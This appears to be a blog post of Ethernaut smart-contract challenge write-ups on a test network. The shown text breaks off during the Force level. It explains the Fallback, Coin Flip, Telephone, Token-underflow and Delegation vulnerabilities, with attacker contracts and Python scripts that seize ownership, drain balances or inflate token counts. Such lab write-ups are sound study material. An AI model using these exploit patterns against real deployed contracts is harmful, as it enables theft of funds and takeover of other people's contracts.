<h1 id="ethernaut-solutions">Ethernaut solutions</h1>
<div class="date">
  <span class="smaller"><b>July 6th, 2022</b></span></div>

<div class="centerPosition"><hr></div>
<p>In an effort to learn and understand Solidity, to either code contracts or audit them in the future (not sure what I want to do yet), I decided to solve the Ethernaut challenges.</p>
<p>These were fun, engaging challenges that allowed me to learn some details, vulnerabilities and intricacies of the EVM and the Solidity programming language. Probably one of the most fun learning experiences I’ve had.</p>
<p>In this article I will basically copy-paste all my solution write-ups from the <a href="https://github.com/dreth/Ethernaut">github repo</a> where I uploaded all of them.</p>
<p>I solved these initially in a local brownie (smart contract development framework on python) using a local fork of the rinkeby test network. After solving each challenge, I then ran the scripts that would perform the transactions on the test network itself to solve the challenges.</p>
<p>If you want to reproduce the same environment I used for it, you can do so by following the instructions in the <a href="https://github.com/dreth/Ethernaut/blob/main/README.md">readme of that same github repo</a>.</p>
<hr>
<h2 id="article-index">Article index</h2>
<ul>
<li><a href="#hello-ethernaut">Hello Ethernaut</a>
<ul>
<li><a href="#submission-transaction">Submission transaction</a></li>
</ul>
</li>
<li><a href="#fallback">Fallback</a>
<ul>
<li><a href="#objectives">Objectives</a></li>
<li><a href="#solution">Solution</a></li>
<li><a href="#how-i-did-it">How I did it</a></li>
<li><a href="#submission-transaction-1">Submission transaction</a></li>
</ul>
</li>
<li><a href="#coin-flip">Coin Flip</a>
<ul>
<li><a href="#objectives-1">Objectives</a></li>
<li><a href="#solution-1">Solution</a></li>
<li><a href="#how-i-did-it-1">How I did it</a></li>
<li><a href="#submission-transaction-2">Submission transaction</a></li>
<li><a href="#minor-tweaks">Minor tweaks</a></li>
</ul>
</li>
<li><a href="#telephone">Telephone</a>
<ul>
<li><a href="#objectives-2">Objectives</a></li>
<li><a href="#solution-2">Solution</a></li>
<li><a href="#how-i-did-it-2">How I did it</a></li>
<li><a href="#submission-transaction-3">Submission transaction</a></li>
</ul>
</li>
<li><a href="#token">Token</a>
<ul>
<li><a href="#objectives-3">Objectives</a></li>
<li><a href="#solution-3">Solution</a>
<ul>
<li><a href="#how-i-did-it-3">How I did it</a></li>
</ul>
</li>
<li><a href="#submission-transaction-4">Submission transaction</a></li>
</ul>
</li>
<li><a href="#delegation">Delegation</a>
<ul>
<li><a href="#objectives-4">Objectives</a></li>
<li><a href="#solution-4">Solution</a></li>
<li><a href="#how-i-did-it-4">How I did it</a></li>
<li><a href="#submission-transaction-5">Submission transaction</a></li>
</ul>
</li>
<li><a href="#force">Force</a>
<ul>
<li><a href="#objectives-5">Objectives</a></li>
<li><a href="#solution-5">Solution</a></li>
<li><a href="#how-i-did-it-5">How I did it</a></li>
<li><a href="#submission-transaction-6">Submission transaction</a></li>
</ul>
</li>
<li><a href="#vault">Vault</a>
<ul>
<li><a href="#objectives-6">Objectives</a></li>
<li><a href="#solution-6">Solution</a></li>
<li><a href="#how-i-did-it-6">How I did it</a></li>
<li><a href="#submission-transaction-7">Submission transaction</a></li>
</ul>
</li>
<li><a href="#king">King</a>
<ul>
<li><a href="#objectives-7">Objectives</a></li>
<li><a href="#solution-7">Solution</a></li>
<li><a href="#how-i-did-it-7">How I did it</a></li>
<li><a href="#submission-transaction-8">Submission transaction</a></li>
</ul>
</li>
<li><a href="#re-entrancy">Re-entrancy</a>
<ul>
<li><a href="#objectives-8">Objectives</a></li>
<li><a href="#solution-8">Solution</a></li>
<li><a href="#how-i-did-it-8">How I did it</a></li>
<li><a href="#submission-transaction-9">Submission transaction</a></li>
</ul>
</li>
<li><a href="#elevator">Elevator</a>
<ul>
<li><a href="#objectives-9">Objectives</a></li>
<li><a href="#solution-9">Solution</a></li>
<li><a href="#how-i-did-it-9">How I did it</a></li>
<li><a href="#submission-transaction-10">Submission transaction</a></li>
</ul>
</li>
<li><a href="#privacy">Privacy</a>
<ul>
<li><a href="#objectives-10">Objectives</a></li>
<li><a href="#solution-10">Solution</a></li>
<li><a href="#how-i-did-it-10">How I did it</a></li>
<li><a href="#submission-transaction-11">Submission transaction</a></li>
</ul>
</li>
<li><a href="#gatekeeper-one">Gatekeeper One</a>
<ul>
<li><a href="#objectives-11">Objectives</a></li>
<li><a href="#solution-11">Solution</a></li>
<li><a href="#how-i-did-it-11">How I did it</a></li>
<li><a href="#submission-transaction-12">Submission transaction</a></li>
</ul>
</li>
<li><a href="#gatekeeper-two">Gatekeeper Two</a>
<ul>
<li><a href="#objectives-12">Objectives</a></li>
<li><a href="#solution-12">Solution</a></li>
<li><a href="#how-i-did-it-12">How I did it</a></li>
<li><a href="#submission-transaction-13">Submission transaction</a></li>
</ul>
</li>
<li><a href="#naught-coin">Naught Coin</a>
<ul>
<li><a href="#objectives-13">Objectives</a></li>
<li><a href="#solution-13">Solution</a></li>
<li><a href="#how-i-did-it-13">How I did it</a></li>
<li><a href="#submission-transaction-14">Submission transaction</a></li>
</ul>
</li>
<li><a href="#preservation">Preservation</a>
<ul>
<li><a href="#objectives-14">Objectives</a></li>
<li><a href="#solution-14">Solution</a></li>
<li><a href="#how-i-did-it-14">How I did it</a></li>
<li><a href="#submission-transaction-15">Submission transaction</a></li>
</ul>
</li>
<li><a href="#recovery">Recovery</a>
<ul>
<li><a href="#objectives-15">Objectives</a></li>
<li><a href="#solution-15">Solution</a></li>
<li><a href="#how-i-did-it-15">How I did it</a></li>
<li><a href="#submission-transaction-16">Submission transaction</a></li>
</ul>
</li>
<li><a href="#magic-number">Magic Number</a>
<ul>
<li><a href="#objectives-16">Objectives</a></li>
<li><a href="#solution-16">Solution</a></li>
<li><a href="#how-i-did-it-16">How I did it</a></li>
<li><a href="#submission-transaction-17">Submission transaction</a></li>
</ul>
</li>
<li><a href="#alien-codex">Alien Codex</a>
<ul>
<li><a href="#objectives-17">Objectives</a></li>
<li><a href="#solution-17">Solution</a></li>
<li><a href="#how-i-did-it-17">How I did it</a></li>
<li><a href="#submission-transaction-18">Submission transaction</a></li>
</ul>
</li>
<li><a href="#denial">Denial</a>
<ul>
<li><a href="#objectives-18">Objectives</a></li>
<li><a href="#solution-18">Solution</a></li>
<li><a href="#how-i-did-it-18">How I did it</a></li>
<li><a href="#submission-transaction-19">Submission transaction</a></li>
</ul>
</li>
<li><a href="#shop">Shop</a>
<ul>
<li><a href="#objectives-19">Objectives</a></li>
<li><a href="#solution-19">Solution</a></li>
<li><a href="#how-i-did-it-19">How I did it</a></li>
<li><a href="#submission-transaction-20">Submission transaction</a></li>
</ul>
</li>
<li><a href="#dex">Dex</a>
<ul>
<li><a href="#objectives-20">Objectives</a></li>
<li><a href="#solution-20">Solution</a>
<ul>
<li><a href="#first-swap">First swap</a></li>
<li><a href="#second-swap">Second swap</a></li>
<li><a href="#third-swap">Third swap</a></li>
<li><a href="#balances-at-each-swap">Balances at each swap</a></li>
</ul>
</li>
<li><a href="#how-i-did-it-20">How I did it</a></li>
<li><a href="#submission-transaction-21">Submission transaction</a></li>
</ul>
</li>
<li><a href="#dex-two">Dex Two</a>
<ul>
<li><a href="#objectives-21">Objectives</a></li>
<li><a href="#solution-21">Solution</a></li>
<li><a href="#how-i-did-it-21">How I did it</a></li>
<li><a href="#submission-transaction-22">Submission transaction</a></li>
</ul>
</li>
<li><a href="#puzzlewallet">PuzzleWallet</a>
<ul>
<li><a href="#objectives-22">Objectives</a></li>
<li><a href="#solution-22">Solution</a></li>
<li><a href="#how-i-did-it-22">How I did it</a></li>
<li><a href="#submission-transaction-23">Submission transaction</a></li>
</ul>
</li>
<li><a href="#motorbike">Motorbike</a>
<ul>
<li><a href="#objectives-23">Objectives</a></li>
<li><a href="#solution-23">Solution</a></li>
<li><a href="#how-i-did-it-23">How I did it</a></li>
<li><a href="#submission-transaction-24">Submission transaction</a></li>
</ul>
</li>
<li><a href="#doubleentrypoint">DoubleEntryPoint</a>
<ul>
<li><a href="#objectives-24">Objectives</a></li>
<li><a href="#solution-24">Solution</a></li>
<li><a href="#how-i-did-it-24">How I did it</a></li>
<li><a href="#submission-transaction-25">Submission transaction</a></li>
</ul>
</li>
</ul>
<hr>
<h2 id="hello-ethernaut">Hello Ethernaut</h2>
<p>The first challenge consists of following a set of instructions given by the contract itself by running some functions.</p>
<p>This is simply an introductory lesson to understand, conceptually, how the Ethernaut challenge is done.</p>
<h3 id="submission-transaction">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x2b290d63d3cf40543bd01923b495c812e6b830fb624769e650d7c48ad7999fde">https://rinkeby.etherscan.io/tx/0x2b290d63d3cf40543bd01923b495c812e6b830fb624769e650d7c48ad7999fde</a></p>
<hr>
<h2 id="fallback">Fallback</h2>
<h3 id="objectives">Objectives</h3>
<ol>
<li>
<p>you claim ownership of the contract</p>
</li>
<li>
<p>you reduce its balance to 0</p>
</li>
</ol>
<h3 id="solution">Solution</h3>
<p>There’s two ways to become owner in this contract:</p>
<ul>
<li>
<p>By contributing (using <code>contribute()</code>) a total amount larger than the contributions of the deployer, which are a total of 1000 ETH deposited in individual transactions of less than 0.001 ETH. It would take 1000001 to 1000002 transactions depositing 0.000999999 ETH every time.</p>
</li>
<li>
<p>By performing the following steps:</p>
</li>
</ul>
<ol>
<li>
<p>Call the <code>contribute()</code> function with a value lower than 0.001 ETH.</p>
</li>
<li>
<p>Now that our contribution is larger 0, we can then send ETH to the contract with a value larger than 0 and we will become owner through the <code>receive()</code> function.</p>
</li>
<li>
<p>We have now become owner and can call the <code>withdraw()</code> function to drain the contract’s funds.</p>
</li>
</ol>
<h3 id="how-i-did-it">How I did it</h3>
<ol>
<li>Contribute 0.0009 ETH calling the <code>contribute()</code> function.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">fallback<span class="token punctuation">.</span>contribute<span class="token punctuation">(</span>_from <span class="token operator">|</span> <span class="token punctuation">{</span><span class="token string">'value'</span><span class="token punctuation">:</span><span class="token number">0.0009</span><span class="token operator">*</span><span class="token number">1e18</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x90f854f08883f751c631d7829ccc0ee0386cfc42ee561fb2e0f088680e369f6f">https://rinkeby.etherscan.io/tx/0x90f854f08883f751c631d7829ccc0ee0386cfc42ee561fb2e0f088680e369f6f</a></p>
<ol>
<li>Send the contract 0.0009 ETH</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">acc<span class="token punctuation">.</span>transfer<span class="token punctuation">(</span>fallback<span class="token punctuation">,</span> <span class="token number">0.0009</span><span class="token operator">*</span><span class="token number">1e18</span><span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x45d02df610de828edff7ee0b80bfee2fa4ac1057ff6bc78ef1c7a2c0875bd26f">https://rinkeby.etherscan.io/tx/0x45d02df610de828edff7ee0b80bfee2fa4ac1057ff6bc78ef1c7a2c0875bd26f</a></p>
<ol start="2">
<li>Call the <code>withdraw()</code> function</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">fallback<span class="token punctuation">.</span>withdraw<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xbbe13aecf3cf7793f032a845bdff886eae1a77d7bc95081b90113cd73a07852a">https://rinkeby.etherscan.io/tx/0xbbe13aecf3cf7793f032a845bdff886eae1a77d7bc95081b90113cd73a07852a</a></p>
<h3 id="submission-transaction-1">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x27e316034f676e3c00c0de9159e12d7441cca833d9a7bf29b366ef835c7dbb86">https://rinkeby.etherscan.io/tx/0x27e316034f676e3c00c0de9159e12d7441cca833d9a7bf29b366ef835c7dbb86</a></p>
<hr>
<h2 id="coin-flip">Coin Flip</h2>
<h3 id="objectives-1">Objectives</h3>
<p>“To complete this level you’ll need to use your psychic abilities to guess the correct outcome 10 times in a row.”</p>
<h3 id="solution-1">Solution</h3>
<p>Generating pseudo-random numbers that are completely unpredictable is a difficult problem within the blockchain. Predicting a coinflip should have a risk of failing of at least 50%, but if we know what factors are used to generate this pseudo-random number, then we can predict the coinflip accurately with a higher probability of success than the intended 50%.</p>
<p>In this case we can <em>always</em> be right, given that there’s 2 factors that generate the coinflip:</p>
<ol>
<li>The variable FACTOR</li>
</ol>
<pre class=" language-js"><code class="prism  language-js">uint256 FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>
</code></pre>
<ol start="2">
<li>The block hash of the previous block to the coinflip converted to integer</li>
</ol>
<pre class=" language-js"><code class="prism  language-js">uint256 blockValue <span class="token operator">=</span> <span class="token function">uint256</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>Our coinflip is floor of the ratio between <code>blockValue</code> and <code>FACTOR</code></p>
<pre class=" language-js"><code class="prism  language-js">uint256 coinFlip <span class="token operator">=</span> blockValue<span class="token punctuation">.</span><span class="token function">div</span><span class="token punctuation">(</span>FACTOR<span class="token punctuation">)</span><span class="token punctuation">;</span>
bool side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
</code></pre>
<p>The problem is then solved by creating an attacker contract that uses the same logic to generate coinflips, but instead to make the guess. Then the guess is plugged into the <code>flip()</code> function.</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">callFlip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external <span class="token punctuation">{</span>
    uint256 factor <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>
    uint256 blockVal <span class="token operator">=</span> <span class="token function">uint256</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    uint256 division <span class="token operator">=</span> blockVal <span class="token operator">/</span> factor<span class="token punctuation">;</span>
    bool guess <span class="token operator">=</span> division <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    coinFlipContract<span class="token punctuation">.</span><span class="token function">flip</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="how-i-did-it-1">How I did it</h3>
<p>I did exactly what I described in the <a href="#solution-1">solution section</a>, but I inherited from Ownable to create the <code>CoinFlipAttack</code> contract as a way to restrict calling the <code>callFlip()</code> function only from the deployer of the attacker contract. After coding the contract I did the following steps:</p>
<ol>
<li>Deploy (at: <code>0xA8834Cc6c91bf94d4FB32D72815C2011CC1c2e15</code>) the attacker contract which I labeled <code>CoinFlipAttack.sol</code></li>
</ol>
<pre class=" language-python"><code class="prism  language-python">coinflipattack <span class="token operator">=</span> CoinFlipAttack<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
</code></pre>
<ol start="2">
<li>Set the instance of the contract with which to interface. My contract instance of CoinFlip, in address <code>0x7BDa91C53648D2a17352e4055fe6834FAABbFc95</code> on the Rinkeby test network.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">coinflipattack<span class="token punctuation">.</span>setInstance<span class="token punctuation">(</span><span class="token string">'0x7BDa91C53648D2a17352e4055fe6834FAABbFc95'</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xff97c5818da48c97f36a10a7a4fe54219744bcd6c3b2d56dcb232e6b58b95249">https://rinkeby.etherscan.io/tx/0xff97c5818da48c97f36a10a7a4fe54219744bcd6c3b2d56dcb232e6b58b95249</a></p>
<ol start="3">
<li>Run a loop of 10 iterations calling the <code>callFlip()</code> function, which will <em>always</em> be right in its prediction.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    coinflipattack<span class="token punctuation">.</span>callFlip<span class="token punctuation">(</span>_from <span class="token operator">|</span> <span class="token punctuation">{</span><span class="token string">'allow_revert'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>First tx: Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xdc681c4c668321064d661fdb4a256bcff495460a897a1367f6d6180258456ab7">https://rinkeby.etherscan.io/tx/0xdc681c4c668321064d661fdb4a256bcff495460a897a1367f6d6180258456ab7</a></p>
<p>Last tx: Block explorer: <a href="https://rinkeby.etherscan.io/tx/">https://rinkeby.etherscan.io/tx/</a></p>
<ol start="4">
<li>Check that we have actually won 10 times in a row by checking the <code>consecutiveWins</code> variable in the CoinFlip contract.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">wins_assertion <span class="token operator">=</span> coinflip<span class="token punctuation">.</span>consecutiveWins<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">10</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>wins_assertion<span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-2">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x137421ce33d24463170860b734fc5fe256c35479e0d53075e491c9112ad7dd34">https://rinkeby.etherscan.io/tx/0x137421ce33d24463170860b734fc5fe256c35479e0d53075e491c9112ad7dd34</a></p>
<h3 id="minor-tweaks">Minor tweaks</h3>
<p>In order for the <code>callFlip()</code> transactions to go through, I had to increase the gas limit for live networks on my brownie config file:</p>
<pre class=" language-yaml"><code class="prism  language-yaml"><span class="token key atrule">networks</span><span class="token punctuation">:</span>
  <span class="token key atrule">live</span><span class="token punctuation">:</span>
    <span class="token key atrule">gas_limit</span><span class="token punctuation">:</span> <span class="token string">"1000000"</span>
</code></pre>
<p>And also use the parameter <code>{'allow_revert':True}</code> when calling <code>callFlip()</code>, as that scenario is a possibility in the definition of <code>flip()</code> on CoinFlip if the previous block hash matches the next block hash, I guess in order to avoid making multiple guess attempts in the same block.</p>
<pre class=" language-python"><code class="prism  language-python">coinflipattack<span class="token punctuation">.</span>callFlip<span class="token punctuation">(</span>_from <span class="token operator">|</span> <span class="token punctuation">{</span><span class="token string">'allow_revert'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<hr>
<h2 id="telephone">Telephone</h2>
<h3 id="objectives-2">Objectives</h3>
<p>Claim ownership of the contract to complete this level.</p>
<h3 id="solution-2">Solution</h3>
<p>The function <code>changeOwner()</code> compares whether the address that sends the tx (<code>tx.origin</code>) is the same as the address that interacts with the contract (<code>msg.sender</code>). In this case it isn’t, so the owner is changed as per the function’s instructions:</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">changeOwner</span><span class="token punctuation">(</span>address _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Therefore, the only thing needed here is a attacking contract which interacts with the original Telephone contract. This way the contract is the <code>msg.sender</code> while the address that interacts with the attacking contract is the <code>tx.origin</code>.</p>
<h3 id="how-i-did-it-2">How I did it</h3>
<ol>
<li>I deployed the contract <code>TelephoneAttack</code> (at: <code>0x756a2E146F4f9659E7c16a90948A09aB09925F19</code>) which interfaces with the original Telephone contract and calls its <code>changeOwner()</code> function as follows:</li>
</ol>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">callChangeOwner</span><span class="token punctuation">(</span>address _newOwner<span class="token punctuation">)</span> external <span class="token punctuation">{</span>
    telephoneContract<span class="token punctuation">.</span><span class="token function">changeOwner</span><span class="token punctuation">(</span>_newOwner<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>where <code>_newOwner</code> is the address we want to assign as new contract owner for the Telephone contract.</p>
<ol start="2">
<li>Set the instance address and call the function with my account address from which I deployed the attacking contract:</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">telephoneattack<span class="token punctuation">.</span>callChangeOwner<span class="token punctuation">(</span>acc<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>  
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x20ffc17549522276816942656e14c9fe459064afd3f99e0f851ca555cfb64711">https://rinkeby.etherscan.io/tx/0x20ffc17549522276816942656e14c9fe459064afd3f99e0f851ca555cfb64711</a></p>
<ol start="3">
<li>Check that we’re the new owner</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">owner_assertion <span class="token operator">=</span> telephone<span class="token punctuation">.</span>owner<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> acc<span class="token punctuation">.</span>address
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'The account owner matches my address: {owner_assertion}'</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-3">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x7c11bb8f65a6117b8f2e17622f3bbdcc81214b8d5daafa41bbbeb54dfc60e4b5">https://rinkeby.etherscan.io/tx/0x7c11bb8f65a6117b8f2e17622f3bbdcc81214b8d5daafa41bbbeb54dfc60e4b5</a></p>
<hr>
<h2 id="token">Token</h2>
<h3 id="objectives-3">Objectives</h3>
<p>The goal of this level is for you to hack the basic token contract below.</p>
<p>You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.</p>
<h3 id="solution-3">Solution</h3>
<p>This contract is using the solidity compiler version 0.6.0, therefore mathematical operations can lead to overflows. In this case, the vulnerability occurs when attempting to call the <code>transfer()</code> function:</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span>address _to<span class="token punctuation">,</span> uint _value<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">returns</span> <span class="token punctuation">(</span>bool<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _value <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _value<span class="token punctuation">;</span>
    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">+=</span> _value<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>The line <code>require(balances[msg.sender] - _value &gt;= 0);</code> checks if the user balance is larger than or equal to zero, but since balances are unsigned integers, when the number we subtract (<code>_value</code>) is larger than the wallet’s balance (<code>balances[msg.sender]</code>) of the token, an overflow occurs and the wallet’s balance becomes the largest unsigned integer minus the difference between these two values.</p>
<p>After passing the require statement, there is another mistake where this overflowed value is assigned to the balance of <code>msg.sender</code>:</p>
<pre class=" language-js"><code class="prism  language-js">balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _value<span class="token punctuation">;</span>
</code></pre>
<p>All we have to do to exploit the contract is call the transfer function as follows:</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token string">'any address except the sending address'</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span>
</code></pre>
<p>From the address whose funds we want to cause the overflow on.</p>
<h4 id="how-i-did-it-3">How I did it</h4>
<ol>
<li>I called the <code>transfer()</code> function and sent 21 tokens (1 more than the original 20 to cause an overflow) to the contract address of the Token contract.</li>
</ol>
<pre class=" language-js"><code class="prism  language-js">token<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>EthernautContractAddresses<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x36f92045c9515a41a0abe02f0f98dbcb1b11b1b30cf09f55f029393426fe8662">https://rinkeby.etherscan.io/tx/0x36f92045c9515a41a0abe02f0f98dbcb1b11b1b30cf09f55f029393426fe8662</a></p>
<ol start="2">
<li>Check that we have actually caused an overflow by checking if our balance is above 20.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">amount_assertion <span class="token operator">=</span> token<span class="token punctuation">.</span>balanceOf<span class="token punctuation">(</span>acc<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">20</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'Does address {acc.address} have more than 20 tokens?: {amount_assertion}'</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-4">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x50dacc40fa0b3e919a98709ae45ac9efcb9c6d4bb2ec5248176b0aefa158c58a">https://rinkeby.etherscan.io/tx/0x50dacc40fa0b3e919a98709ae45ac9efcb9c6d4bb2ec5248176b0aefa158c58a</a></p>
<hr>
<h2 id="delegation">Delegation</h2>
<h3 id="objectives-4">Objectives</h3>
<p>The goal of this level is for you to claim ownership of the instance you are given.</p>
<h3 id="solution-4">Solution</h3>
<p>The contract Delegate defines the function <code>pwn()</code> which easily allows you to take control of the contract. However, to take control of the Delegation contract, we must call this <code>pwn()</code> function through a low level delegate call where we pass the <code>pwn()</code> function encoded through the data sent in a transaction that will trigger the <code>fallback()</code> function of the Delegation contract.</p>
<p>The ownership can be taken by performing a transfer of 0 wei (or low level <code>call.data</code>) to the Delegation contract with <code>0xdd365b8b</code> in the message data. These are the first 4 bytes of the SHA-3 hash for the text <code>'pwn()'</code>.</p>
<h3 id="how-i-did-it-4">How I did it</h3>
<ol>
<li>Obtain the SHA-3 hash for the text <code>'pwn()'</code> using <code>web3.sha3()</code> from <a href="http://web3.py">web3.py</a> and extract the first 4 bytes of the hash.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">pwn_bytes <span class="token operator">=</span> web3<span class="token punctuation">.</span>sha3<span class="token punctuation">(</span>text<span class="token operator">=</span><span class="token string">'pwn()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span>
</code></pre>
<ol start="2">
<li>Perform a simple transfer with a value of 0 but including the bytes in the tx data.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">acc<span class="token punctuation">.</span>transfer<span class="token punctuation">(</span>to<span class="token operator">=</span>delegation<span class="token punctuation">.</span>address<span class="token punctuation">,</span> amount<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> data<span class="token operator">=</span>pwn_bytes<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xe258aaa31a241c776693da995e11fc3fa0c9777b7e88cc6820767e3f6a914e91">https://rinkeby.etherscan.io/tx/0xe258aaa31a241c776693da995e11fc3fa0c9777b7e88cc6820767e3f6a914e91</a></p>
<ol start="3">
<li>Check whether we are owner or not</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">owner_assertion <span class="token operator">=</span> delegation<span class="token punctuation">.</span>owner<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> acc<span class="token punctuation">.</span>address
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'The owner of the contract is {acc.address}, therefore the assertion is {owner_assertion}'</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-5">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x69562563ddeb59bc8beeb241403bf8406fd9bdb7e4534f940052012f01f228ea">https://rinkeby.etherscan.io/tx/0x69562563ddeb59bc8beeb241403bf8406fd9bdb7e4534f940052012f01f228ea</a></p>
<hr>
<h2 id="force">Force</h2>
<h3 id="objectives-5">Objectives</h3>
<p>The goal of this level is to make the balance of the contract greater than zero.</p>
<h3 id="solution-5">Solution</h3>
<p>From my research, there’s several ways of sending funds to a contract that has no <code>payable</code> methods:</p>
<ol>
<li>
<p>Send funds to the address the contract will be deployed in, because contract addresses are deterministic.</p>
</li>
<li>
<p>Send funds to the contract by destroying of another contract, which sends all of its balance through <code>selfdestruct(&lt;destination&gt;)</code>.</p>
</li>
<li>
<p>By making it the recipient of a block reward, which can’t be rejected.</p>
